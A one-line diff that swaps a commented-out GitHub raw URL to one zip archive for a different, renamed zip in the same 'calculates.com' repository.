@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/phornnato/calculates.com/main/jawbreakingly/calculates.com-1.3-alpha.4.zip
+# https://raw.githubusercontent.com/phornnato/calculates.com/main/jawbreakingly/com-calculates-v2.8.zip
